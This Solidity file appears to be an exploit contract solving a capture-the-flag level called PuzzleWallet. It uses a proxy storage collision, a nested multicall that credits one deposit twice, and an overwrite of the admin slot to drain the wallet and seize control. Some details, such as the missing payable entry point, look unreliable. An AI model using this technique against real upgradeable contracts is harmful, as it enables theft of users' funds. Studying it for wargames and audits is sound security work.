// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./24-puzzlewallet.sol"; //  

contract Attack24 {
    PuzzleWallet public target;
    PuzzleProxy public proxy;
    // address public owner;

    event AddedToWhiteList(address indexed _address);

    constructor(address payable _targetAddress) {
        // owner = msg.sender;
        target = PuzzleWallet(_targetAddress);        
        proxy = PuzzleProxy(_targetAddress);
    }

    function attack() public {
        proxy.proposeNewAdmin(address(this));
        target.addToWhitelist(address(this));

        // build deposit and multicall   <--  HERE hare (or in other words the github code)

        bytes memory deposit_sig = abi.encodeWithSignature("deposit()");
        bytes[] memory deposit_sig_in_array = new bytes[](1);
        deposit_sig_in_array[0] = deposit_sig;

        bytes memory multicall_sig = abi.encodeWithSignature(
            "multicall(bytes[])",
            deposit_sig_in_array
        );
        
        bytes[] memory data = new bytes[](2);
        data[0] = deposit_sig;
        data[1] = multicall_sig;
        target.multicall{value: address(this).balance}(data);
        bytes memory transfer_sig = abi.encodeWithSignature(
            "transfer(int)",
            address(target).balance
        );

        target.execute(msg.sender, address(target).balance, transfer_sig);
        target.setMaxBalance(uint256(uint160(msg.sender)));
     }

    // function withdraw() public view {
    //     require(owner == msg.sender, "not allowed, sorry");
    //     // withdraw all funds using a call()
    // }
}



